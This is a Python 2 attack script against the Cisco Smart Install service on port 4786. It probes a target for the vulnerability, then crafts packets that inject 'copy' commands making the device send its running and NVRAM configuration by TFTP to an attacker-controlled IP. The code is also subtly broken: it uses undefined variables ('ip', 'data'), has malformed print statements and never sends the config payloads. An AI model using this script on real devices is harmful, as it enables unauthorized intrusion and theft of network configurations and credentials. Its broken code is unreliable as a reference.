import sys
import socket

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
attacker_ip = sys.argv[3]

print "[*] Testing: %s:%s" % (target_ip, target_port)
print "[*] Testing for Smart Install vulnerability"
sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '4' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8
sTcp = sTcp.decode('hex')
conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn_with_host.settimeout(5)
conn_with_host.connect((ip, 4786))
print "[*] Testing with mode set to 1"
print "[*] Sending data to target: %s" sTcp
conn_with_host.send(data)
resp = '0' * 7 + '4' + '0' * 8 + '0' * 7 + '3' + '0' * 7 + '8' + '0' * 7 + '1' + '0' * 8
while True:
    data = conn_with_host.recv(2000)
    if len(data)<1:
        print "\t[+] Smart Install Director feature active on %s" % target_ip
        print "\t\t[!] %s is not vulnerable"
        break
    elif (len(data) == 24):
        if (data.encode('hex') == resp):
            print "\t[+] Smart Install Director feature active on %s" % target_ip
            print "\t\t[!] %s is vulnerable" % target_ip
            break
        else:
            print "\t[!] Unexpected response received. Smart Install service may be running on %s" % target_ip
            print data
            print "\t\t[!] %s may be vulnerable" % target_ip
            break
conn_with_host.close()
print "[*] Trying to get router-config file with system technique"
c1 = 'copy system:running-config flash:/config.text'
c2 = 'copy flash:/config.text tftp://' + attacker_ip + '/' + target_ip + '-system.conf'
c3 = ''
sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
sTcp = sTcp.decode('hex')
conn_with_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn_with_host.settimeout(5)
conn_with_host.connect((ip, 4786))
print "[*] Sending data to target: %s" sTcp
print "[*] Check your TFTP server for the downloaded config file"

print "[*] Trying to get router-config file with nvram technique"
c1 = 'copy nvram:running-config flash:/config.text'
c2 = 'copy flash:/config.text tftp://' + attacker_ip + '/' + target_ip + '-nvram.conf'
c3 = ''
sTcp = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '800000' + '40800010014' + '0' * 7 + '10' + '0' * 7 + 'fc994737866' + '0' * 7 + '0303f4'
sTcp = sTcp + c1.encode('hex') + '00' * (336 - len(c1))
sTcp = sTcp + c2.encode('hex') + '00' * (336 - len(c2))
sTcp = sTcp + c3.encode('hex') + '00' * (336 - len(c3))
sTcp = sTcp.decode('hex')
print "[*] Sending data to target: %s" sTcp
print "[*] Check your TFTP server for the downloaded config file"

